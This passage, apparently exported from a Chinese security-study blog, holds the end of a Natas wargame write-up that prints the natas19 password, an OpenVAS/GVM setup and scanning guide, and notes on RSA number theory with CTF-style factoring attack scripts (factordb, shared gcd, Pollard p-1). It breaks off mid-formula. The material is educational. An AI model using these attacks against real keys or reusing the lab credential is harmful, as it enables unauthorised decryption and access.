<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312202106054.png" /></p>
<p>得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: natas19</span><br><span class="line">Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s</span><br></pre></td></tr></table></figure>
<h2 id="natas-level-18-level-19">20. Natas Level 18 → Level 19</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas19</span><br><span class="line"><span class="symbol">URL:</span>      http://natas19.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p><strong>题目信息</strong></p>
<p><strong>This page uses mostly the same code as the previous level,
but session IDs are no longer sequential...</strong></p>
<p>You are logged in as a regular user. Login as an admin to retrieve
credentials for natas20.</p>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>Wargames</category>
        <category>Natas</category>
      </categories>
      <tags>
        <tag>web-security</tag>
      </tags>
  </entry>
  <entry>
    <title>OPENVAS</title>
    <url>/2022/01/25/OPENVAS/</url>
    <content><![CDATA[<p><strong>注意：</strong>
openvas已改名为gvm，不过基本用法还是一样的，如：openvas-start=gvm-start</p>
<h2 id="openvas简介">1. Openvas简介</h2>
<p>• Nessus项目分支</p>
<p>• 管理目标系统的漏洞</p>
<p>• 免费开源</p>
<p>• Kali默认安装，但未配置和启动</p>
<p>• 更新很快</p>
<h3 id="基本架构"><strong>1、基本架构</strong></h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125212434005-1512362263.png" /></p>
<h3 id="openvas-manager">2、OpenVAS Manager</h3>
<p>• 控制scanner和其他manager的中心组件</p>
<p>• 控制中心数据库，保存用户配置及扫描结果</p>
<p>• 客户端使用基于XML的无状态OMP协议与其通信</p>
<p>• 集中排序筛选，使客户端获得一致展现</p>
<h3 id="openvas-scanner">3、OpenVAS Scanner</h3>
<p>• 具体执行Network Vulnerability Tests （NVTs）</p>
<p>• NVTs 每天通过 Feed 更新</p>
<p>• 受 Manager 控制</p>
<h3 id="osp-scanner">4、OSP Scanner</h3>
<p>• 可以统一管理多个scanner</p>
<p>• 将一组 scanner 作为一个对象交给manager管理</p>
<h3 id="greenbone-security-assistant-gsa">5、Greenbone Security
Assistant (GSA)</h3>
<p>• 提供 Web service</p>
<h3 id="openvas-cli">6、OpenVAS CLI</h3>
<p>• omp 命令行工具，可实现批处理控制 manager</p>
<h2 id="安装">2. 安装</h2>
<h3 id="kali-1.0-老版本安装基本流程">1、Kali 1.0 老版本安装基本流程</h3>
<p><strong>• 安装</strong></p>
<p><strong>• 创建证书</strong></p>
<p><strong>• 同步弱点数据库</strong></p>
<p><strong>• 创建客户端证书</strong></p>
<p><strong>• 重建数据库</strong></p>
<p><strong>• 备份数据库</strong></p>
<p><strong>• 启动服务装入插件</strong></p>
<p><strong>• 创建管理员账号</strong></p>
<p><strong>• 创建普通用户账号</strong></p>
<p><strong>• 配置服务侦听端口</strong></p>
<p><strong>• 安装验证</strong></p>
<h3 id="新版-kali-安装">2、新版 Kali 安装</h3>
<p><strong>• 初始化安装</strong></p>
<p>• openvas-setup</p>
<p><strong>• 检查安装结果</strong></p>
<p>• openvas-check-setup</p>
<p><strong>• 查看当前账号</strong></p>
<p>• openvasmd --list-users</p>
<p><strong>• 修改账号密码（遗忘密码是可通过如下方式修改）</strong></p>
<p>• openvasmd --user=admin --new-password=Passw0rd #可先通过openvasmd
--get- users 查看有哪些用户名</p>
<p><strong>• 升级</strong></p>
<p>• openvas-feed-update</p>
<h2 id="基本用法">3. 基本用法</h2>
<h3 id="启动服务">1、启动服务</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@promote:/home/z9m8r8<span class="comment"># netstat -pantu | grep 939</span></span><br><span class="line">root@promote:/home/z9m8r8<span class="comment"># gvm-start </span></span><br><span class="line">[&gt;] Please <span class="built_in">wait</span> <span class="keyword">for</span> the GVM services to start.</span><br><span class="line">[&gt;]</span><br><span class="line">[&gt;] You might need to refresh your browser once it opens.</span><br><span class="line">[&gt;]</span><br><span class="line">[&gt;]  Web UI (Greenbone Security Assistant): https://127.0.0.1:9392</span><br><span class="line"></span><br><span class="line">● greenbone-security-assistant.service - Greenbone Security Assistant (gsad)</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/greenbone-security-assistant.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Tue 2022-01-25 22:04:17 CST; 25ms ago</span><br><span class="line">       Docs: man:gsad(8)</span><br><span class="line">             https://www.greenbone.net</span><br><span class="line">    Process: 1822 ExecStart=/usr/sbin/gsad --listen=127.0.0.1 --port=9392 (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 1823 (gsad)</span><br><span class="line">      Tasks: 3 (<span class="built_in">limit</span>: 2255)</span><br><span class="line">     Memory: 2.4M</span><br><span class="line">        CPU: 31ms</span><br><span class="line">     CGroup: /system.slice/greenbone-security-assistant.service</span><br><span class="line">             ├─1823 /usr/sbin/gsad --listen=127.0.0.1 --port=9392</span><br><span class="line">             └─1824 /usr/sbin/gsad --listen=127.0.0.1 --port=9392</span><br><span class="line"></span><br><span class="line">1月 25 22:04:16 promote systemd[1]: Starting Greenbone Security Assistant (gsad)...</span><br><span class="line">1月 25 22:04:17 promote gsad[1822]: Oops, secure memory pool already initialized</span><br><span class="line">1月 25 22:04:17 promote systemd[1]: Started Greenbone Security Assistant (gsad).</span><br><span class="line"></span><br><span class="line">● gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/gvmd.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Tue 2022-01-25 22:04:11 CST; 15s ago</span><br><span class="line">       Docs: man:gvmd(8)</span><br><span class="line">    Process: 1783 ExecStart=/usr/sbin/gvmd --osp-vt-update=/run/ospd/ospd.sock (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 1786 (gvmd)</span><br><span class="line">      Tasks: 1 (<span class="built_in">limit</span>: 2255)</span><br><span class="line">     Memory: 100.0M</span><br><span class="line">        CPU: 1.433s</span><br><span class="line">     CGroup: /system.slice/gvmd.service</span><br><span class="line">             └─1786 gvmd: Waiting <span class="keyword">for</span> incoming connections</span><br><span class="line"></span><br><span class="line">1月 25 22:04:01 promote systemd[1]: Starting Greenbone Vulnerability Manager daemon (gvmd)...</span><br><span class="line">1月 25 22:04:01 promote systemd[1]: gvmd.service: Can<span class="string">&#x27;t open PID file /run/gvm/gvmd.pid (yet?) after start: Operation not permitted</span></span><br><span class="line"><span class="string">1月 25 22:04:11 promote systemd[1]: Started Greenbone Vulnerability Manager daemon (gvmd).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">● ospd-openvas.service - OSPd Wrapper for the OpenVAS Scanner (ospd-openvas)</span></span><br><span class="line"><span class="string">     Loaded: loaded (/lib/systemd/system/ospd-openvas.service; disabled; vendor preset: disabled)</span></span><br><span class="line"><span class="string">     Active: active (running) since Tue 2022-01-25 22:04:00 CST; 33s ago</span></span><br><span class="line"><span class="string">       Docs: man:ospd-openvas(8)</span></span><br><span class="line"><span class="string">             man:openvas(8)</span></span><br><span class="line"><span class="string">    Process: 1751 ExecStart=/usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf --unix-socket /run/ospd/ospd.sock --pid-file /run/ospd/ospd-openvas.pid --log-file /var/log/gvm/ospd-openvas.log --lock-file-dir /var/lib/openvas (code=exited, status=0/SUCCESS)</span></span><br><span class="line"><span class="string">   Main PID: 1769 (ospd-openvas)</span></span><br><span class="line"><span class="string">      Tasks: 6 (limit: 2255)</span></span><br><span class="line"><span class="string">     Memory: 164.2M</span></span><br><span class="line"><span class="string">        CPU: 2.587s</span></span><br><span class="line"><span class="string">     CGroup: /system.slice/ospd-openvas.service</span></span><br><span class="line"><span class="string">             ├─1769 /usr/bin/python3 /usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf --unix-socket /run/ospd/ospd.sock --pid-file /run/ospd/ospd-openvas.pid --log-file /var/log/gvm/ospd-openvas.log --lock-file-dir /var/lib/openvas</span></span><br><span class="line"><span class="string">             ├─1771 /usr/bin/python3 /usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf --unix-socket /run/ospd/ospd.sock --pid-file /run/ospd/ospd-openvas.pid --log-file /var/log/gvm/ospd-openvas.log --lock-file-dir /var/lib/openvas</span></span><br><span class="line"><span class="string">             ├─1811 openvas --update-vt-info</span></span><br><span class="line"><span class="string">             └─1813 openvas --update-vt-info</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1月 25 22:03:55 promote systemd[1]: Starting OSPd Wrapper for the OpenVAS Scanner (ospd-openvas)...</span></span><br><span class="line"><span class="string">1月 25 22:04:00 promote systemd[1]: Started OSPd Wrapper for the OpenVAS Scanner (ospd-openvas).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[&gt;] Opening Web UI (https://127.0.0.1:9392) in: 5... 4... 3... 2... 1... </span></span><br><span class="line"><span class="string">root@promote:/home/z9m8r8# netstat -pantu | grep 939  #端口的检查：</span></span><br><span class="line"><span class="string">tcp        0      0 127.0.0.1:9392          0.0.0.0:*               LISTEN      1823/gsad</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125221041328-1543962033.png" /></p>
<p><strong>openvas-start
如果启动失败，可按如下修改服务启动顺序</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /usr/bin/openvas-start</span><br><span class="line"></span><br><span class="line">Starting OpenVas Services</span><br><span class="line"></span><br><span class="line">Starting OpenVAS Manager: openvasmd</span><br><span class="line"></span><br><span class="line">Starting OpenVAS Scanner: openvassd</span><br><span class="line"></span><br><span class="line">Starting Greenbone Security Assistant: gsad</span><br></pre></td></tr></table></figure>
<h3 id="基本信息修改">2、基本信息修改</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125221339835-1846404268.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125221429672-708092856.png" /></p>
<p><strong>备注：</strong>language不建议修改，翻译不一定准确！</p>
<h3 id="扫描配置">3、扫描配置</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125222240138-212132727.png" /></p>
<p><strong>• 扫描windows</strong></p>
<p><strong>示例（新建一个Windows_xp的扫描配置）：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125222658296-1210706632.png" />
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125223717242-2102649489.png" />
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125223925641-970749697.png" /></p>
<p>• 扫描Linux（配置同理）</p>
<p>• 扫描网络设备（配置同理）</p>
<h3 id="扫描目标">4、扫描目标</h3>
<p><strong>• Windows</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125224445436-1446942478.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125225032833-849196569.png" /></p>
<p>• Linux</p>
<p>• 路由器</p>
<h3 id="扫描任务">5、扫描任务</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125225352953-768616693.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125230039104-1679372583.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125225926547-244124674.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125230303202-1968828127.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125231723482-2146388597.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220125232014801-1697882154.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA 常见攻击</title>
    <url>/2023/12/16/RSA%20%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="数论知识">1. 数论知识</h2>
<h3 id="互质关系">1.1. 互质关系</h3>
<p>如果两个正整数，除了1以外，没有其他公因子，即 gcd(a,b)=1</p>
<p>关于互质关系，不难得到以下结论：</p>
<ol type="1">
<li><p>任意两个质数构成互质关系，比如13和61。</p></li>
<li><p>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</p></li>
<li><p>如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</p></li>
<li><p>1和任意一个自然数是都是互质关系，比如1和99。</p></li>
<li><p>p是大于1的整数，则p和p-1构成互质关系，比如57和56。</p></li>
<li><p>p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p></li>
</ol>
<h3 id="欧拉函数">1.2. 欧拉函数</h3>
<p>φ(n)：不超过n，且与n互质的元素个数</p>
<p><strong>φ(n) 的计算</strong></p>
<p>第一种情况</p>
<p>如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。</p>
<p>第二种情况</p>
<p>如果n是质数，则 φ(n)=n-1
。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</p>
<p><strong>第三种情况</strong></p>
<p>如果n是质数的某一个次方，即 n = p^k
(p为质数，k为大于等于1的整数)，则</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161512335.png" /></p>
<p>比如 φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4。</p>
<p>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p<sup>(k-1)个，即1×p、2×p、3×p、...、p</sup>(k-1)×p，把它们去除，剩下的就是与n互质的数。</p>
<p>上面的式子还可以写成下面的形式：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161512436.png" /></p>
<p>可以看出，上面的第二种情况是 k=1 时的特例。</p>
<p><strong>第四种情况</strong></p>
<p>如果n可以分解成两个互质的整数之积</p>
<p>n = p1 × p2</p>
<p>则</p>
<p>φ(n) = φ(p1p2) = φ(p1)φ(p2)</p>
<p>即积的<a
href="https://so.csdn.net/so/search?q=%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">欧拉函数</a>等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p>
<p>这一条的证明要用到<a
href="http://en.wikipedia.org/wiki/Chinese_remainder_theorem"
title="&quot;中国剩余定理&quot;">"中国剩余定理"</a>，</p>
<p>第五种情况</p>
<p>因为任意一个大于1的正整数，都可以写成一系列质数的积。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161517420.png" /></p>
<p>根据第4条的结论，得到</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161517060.png" /></p>
<p>再根据第3条的结论，得到</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161517837.png" /></p>
<p>也就等于</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161518400.png" /></p>
<p>这就是欧拉函数的通用计算公式。比如，1323的欧拉函数，计算过程如下：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161518443.png" /></p>
<h3 id="欧拉定理">1.3. 欧拉定理</h3>
<p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161521197.png" /></p>
<p>也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。</p>
<p>欧拉定理的证明比较复杂，这里就省略了。我们只要记住它的结论就行了。</p>
<p>欧拉定理可以大大简化某些运算。比如，7和10互质，根据欧拉定理，</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161523490.png" /></p>
<p>已知 φ(10) 等于4，所以马上得到7的4倍数次方的个位数肯定是1。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161523779.png" /></p>
<p>因此，7的任意次方的个位数（例如7的222次方），心算就可以算出来。</p>
<p>欧拉定理有一个特殊情况【著名的<a
href="http://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86"
title="费马小定理">费马小定理</a>】。</p>
<p>假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161524161.png" /></p>
<h3 id="逆元或模反元素">1.4. 逆元或模反元素</h3>
<p>若 <span class="math inline">\(m \geq
1\)</span>，gcd(a,m)=1，则存在c，使得 <span class="math inline">\(ac
\equiv 1 (mod\ m)\)</span> ，c 即为 a 逆元</p>
<p>欧拉定理可以用来证明模反元素必然存在。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161636526.png" /></p>
<p>a 的 φ(n)-1 次方即为 a 的逆元</p>
<h2 id="rsa-公钥密码">2. RSA 公钥密码</h2>
<h3 id="加解密算法">2.1. 加解密算法</h3>
<p>① 随机地选择两个大素数 p和 q，而且保密；</p>
<p>② 计算n=pq，将 n公开；</p>
<p>③ 计算φ(n)=(p-1)(q-1)，对φ(n)保密；</p>
<p>④ 随机地选取一个正整数e，1&lt;e&lt;φ(n)且（e，φ(n)）=1，将
e公开；</p>
<p>⑤ 根据 ed＝1 mod φ(n)，求出d，并对d保密；</p>
<p>⑥ 加密运算：C＝M^e mod n</p>
<p>⑦ 解密运算：M＝C^d mod n</p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309251455780.webp"
alt="RSA算法原理图解.webp" />
<figcaption aria-hidden="true">RSA算法原理图解.webp</figcaption>
</figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309162031298.png" /></p>
<h3 id="算法论证">2.2. 算法论证</h3>
<p>加密：<span class="math inline">\(y\ =\ x^e \ mod\ n\)</span></p>
<p>解密：<span class="math inline">\(x\ =\ y^d \ mod\ n\)</span></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161709824.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309161709364.png" /></p>
<p><strong>注，不互素的证明不太理解！</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/450180396">RSA ——
经典的非对称加密算法 - 知乎</a></p>
<p>武汉大学-张焕国-PPT</p>
<h3 id="安全性证明">2.3. 安全性证明</h3>
<p>逆推可知，破译RSA密码的困难性≤对n因子分解的困难性。</p>
<h2 id="rsa-常见攻击">3. RSA 常见攻击</h2>
<h3 id="直接模数分解">3.1. 直接模数分解</h3>
<p><strong>攻击条件：</strong></p>
<p>在 N 的比特位数小于 512 的时候，可以采用大整数分解的策略获取 p 和
q。</p>
<p><strong>n的分解：</strong></p>
<ul>
<li><p>yafu</p></li>
<li><p><a href="http://www.factordb.com/">factordb.com</a></p></li>
</ul>
<p><strong>RSA 解密示例脚本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> factordb <span class="keyword">import</span> factordb  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse  </span><br><span class="line">  </span><br><span class="line">N = factordb.FactorDB(  </span><br><span class="line">    <span class="number">383347712330877040452238619329524841763392526146840572232926924642094891453979246383798913394114305368360426867021623649667024217266529000859703542590316063318592391925062014229671423777796679798747131250552455356061834719512365575593221216339005132464338847195248627639623487124025890693416305788160905762011825079336880567461033322240015771102929696350161937950387427696385850443727777996483584464610046380722736790790188061964311222153985614287276995741553706506834906746892708903948496564047090014307484054609862129530262108669567834726352078060081889712109412073731026030466300060341737504223822014714056413752165841749368159510588178604096191956750941078391415634472219765129561622344109769892244712668402761549412177892054051266761597330660545704317210567759828757156904778495608968785747998059857467440128156068391746919684258227682866083662345263659558066864109212457286114506228470930775092735385388316268663664139056183180238043386636254075940621543717531670995823417070666005930452836389812129462051771646048498397195157405386923446893886593048680984896989809135802276892911038588008701926729269812453226891776546037663583893625479252643042517196958990266376741676514631089466493864064316127648074609662749196545969926051</span>)  </span><br><span class="line">  </span><br><span class="line">N.get_factor_list()  </span><br><span class="line">N.connect()  </span><br><span class="line">N.get_factor_list()  </span><br><span class="line">p = N.get_factor_list()[<span class="number">0</span>]  </span><br><span class="line">q = N.get_factor_list()[<span class="number">1</span>]  </span><br><span class="line">  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">  </span><br><span class="line">c = <span class="number">98280456757136766244944891987028935843441533415613592591358482906016439563076150526116369842213103333480506705993633901994107281890187248495507270868621384652207697607019899166492132408348789252555196428608661320671877412710489782358282011364127799563335562917707783563681920786994453004763755404510541574502176243896756839917991848428091594919111448023948527766368304503100650379914153058191140072528095898576018893829830104362124927140555107994114143042266758709328068902664037870075742542194318059191313468675939426810988239079424823495317464035252325521917592045198152643533223015952702649249494753395100973534541766285551891859649320371178562200252228779395393974169736998523394598517174182142007480526603025578004665936854657294541338697513521007818552254811797566860763442604365744596444735991732790926343720102293453429936734206246109968817158815749927063561835274636195149702317415680401987150336994583752062565237605953153790371155918439941193401473271753038180560129784192800351649724465553733201451581525173536731674524145027931923204961274369826379325051601238308635192540223484055096203293400419816024111797903442864181965959247745006822690967920957905188441550106930799896292835287867403979631824085790047851383294389</span>  </span><br><span class="line">  </span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">d = inverse(e, phi)  </span><br><span class="line">flag = <span class="built_in">pow</span>(c, d, N.n)  </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag).decode())</span><br></pre></td></tr></table></figure>
<h3 id="利用公约数求解">3.2. 利用公约数求解</h3>
<p><strong>攻击条件：</strong></p>
<p>如果两次公钥的加密过程中使用的 n1 和 n2
具有相同的素因子，则可以利用欧几里得算法直接将 n1 和 n2 分解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = gmpy2.gcd(n1,n2)   <span class="comment">#gmpy2库函数gcd(),用于求最大公约数。</span></span><br></pre></td></tr></table></figure>
<h3 id="其它模数分解">3.3. 其它模数分解</h3>
<h4 id="攻击条件">3.3.1. 攻击条件</h4>
<p>当 RSA 中 p 和 q 选取不当时，我们也可以进行攻击。</p>
<h4 id="p-q-很大">3.3.2. |p-q| 很大</h4>
<p>当 p-q 很大时，一定存在某一个参数较小，这里我们假设为
p，那么我们可以通过穷举的方法对模数进行试除，从而分解模数，得到保密参数与明文信息。基本来说，不怎么可行。</p>
<h4 id="p-q-较小">3.3.3. |p-q| 较小</h4>
<p>首先 <span
class="math display">\[\frac{(p+q)^2}{4}-n=\frac{(p+q)^2}{4}-pq=\frac{(p-q)^2}{4}\]</span></p>
<p>既然 <span class="math inline">\(|p-q|\)</span> 较小，那么 <span
class="math inline">\(\frac{(p-q)^2}{4}\)</span> 自然也比较小，进而 <span
class="math inline">\(\frac{(p+q)^2}{4}\)</span> 只是比 <span
class="math inline">\(N\)</span> 稍微大一点，所以 <span
class="math inline">\(\frac{p+q}{2}\)</span> 与 <span
class="math inline">\(\sqrt{n}\)</span>
相近。那么我们可以按照如下方法来分解</p>
<ul>
<li><p>顺序检查 <span
class="math inline">\(\sqrt{n}\)</span> 的每一个整数 <span
class="math inline">\(x\)</span>，直到找到一个 <span
class="math inline">\(x\)</span> 使得 <span
class="math inline">\(x^2-n\)</span> 是平方数，记为 <span
class="math inline">\(y^2\)</span></p></li>
<li><p>那么 <span
class="math inline">\(x^2-n=y^2\)</span>，进而根据平方差公式即可分解
<span class="math inline">\(N\)</span></p></li>
</ul>
<h4 id="p---1-光滑">3.3.4. p - 1 光滑</h4>
<ul>
<li><p>光滑数 (Smooth number)：指可以分解为小素数乘积的正整数</p></li>
<li><p>当 <span class="math inline">\(p\)</span> 是 <span
class="math inline">\(N\)</span> 的因数，并且 <span
class="math inline">\(p-1\)</span> 是光滑数，可以考虑使用
<code>Pollard's p-1</code> 算法来分解 <span
class="math inline">\(N\)</span></p></li>
<li><p>根据费马小定理有 <span class="math display">\[若 p\nmid a,\ 则
a^{p-1} \equiv 1 \pmod{p}\]</span></p>
<p>则有 <span class="math display">\[a^{t(p-1)}\equiv 1^t \equiv
1\pmod{p}\]</span></p>
<p>即 <span class="math display">\[a^{t(p-1)} - 1 =
k*p\]</span></p></li>
<li><p>根据 <code>Pollard's p-1</code> 算法：</p>
<p>如果 p 是一个 <span class="math inline">\(B-smooth\
number\)</span>，那么则存在 <span class="math display">\[M =
\prod_{q\le{B}}{q^{\lfloor\log_q{B}\rfloor}}\]</span></p>
<p>使得 <span class="math inline">\((p-1)\mid M\)</span> 成立，则有
<span class="math inline">\(\gcd{(a^{M}-1, N)}\)</span></p>
<p>如果结果不为 1 或  <span
class="math inline">\(N\)</span>，那么就已成功分解 <span
class="math inline">\(N\)</span>。</p>
<p>因为我们只关心最后的 gcd 结果，同时 <span
class="math inline">\(N\)</span>
只包含两个素因子，则我们不需要计算 <span
class="math inline">\(M\)</span>，考虑 <span
class="math inline">\(n=2,3,\dots\)</span>，令 <span
class="math inline">\(M = n!\)</span> 即可覆盖正确的 <span
class="math inline">\(M\)</span> 同时方便计算。</p></li>
<li><p>在具体计算中，可以代入降幂进行计算 <span
class="math display">\[a^{n!}\bmod{N}=\begin{cases}
(a\bmod{N})^2\mod{N}&amp;n=2\\ (a^{(n-1)!}\bmod{N})^n\mod{N}&amp;n\ge{3}
\end{cases}\]</span></p></li>
<li><p>Python 代码实现</p></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        d = invert(e, (res-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = powmod(c, d, N)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="p-1-光滑">3.3.5. p + 1 光滑</h4>
<ul>
<li><p>当 <span class="math inline">\(p\)</span> 是 <span
class="math inline">\(N\)</span> 的因数，并且 <span
class="math inline">\(p+1\)</span> 是光滑数，可以考虑使用
<code>Williams's p+1</code> 算法来分解 <span
class="math inline">\(N\)</span></p></li>
<li><p>已知 <span class="math inline">\(N\)</span> 的因数 <span
class="math inline">\(p\)</span>，且 <span
class="math inline">\(p+1\)</span> 是一个光滑数 <span
class="math display">\[p =
\left(\prod_{i=1}^k{q_i^{\alpha_i}}\right)+1\]</span> <span
class="math inline">\(q_i\)</span> 即第 i 个素因数且有 <span
class="math inline">\(q_i^{\alpha_i}\le B_1\)</span>, 找到 <span
class="math inline">\(\beta_i\)</span> 使得让 <span
class="math inline">\(q_i^{\beta_i}\le B_1\)</span> 且 <span
class="math inline">\(q_i^{\beta_i+1}&gt; B_1\)</span>，然后令 <span
class="math display">\[R = \prod_{i=1}^k{q_i^{\beta_i}}\]</span>
显然有 <span class="math inline">\(p-1\mid R\)</span> 且当 <span
class="math inline">\((N, a) = 1\)</span> 时有 <span
class="math inline">\(a^{p-1}\equiv 1 \pmod{p}\)</span>，所以有 <span
class="math inline">\(a^R\equiv 1\pmod{p}\)</span>，即 <span
class="math display">\[p\mid(N, a^R-1)\]</span></p></li>
<li><p>令 <span class="math inline">\(P,Q\)</span> 为整数，<span
class="math inline">\(\alpha,\beta\)</span> 为方程 <span
class="math inline">\(x^2-Px+Q=0\)</span> 的根，定义如下类卢卡斯序列
<span class="math display">\[\begin{aligned} U_n(P, Q) &amp;= (\alpha^n
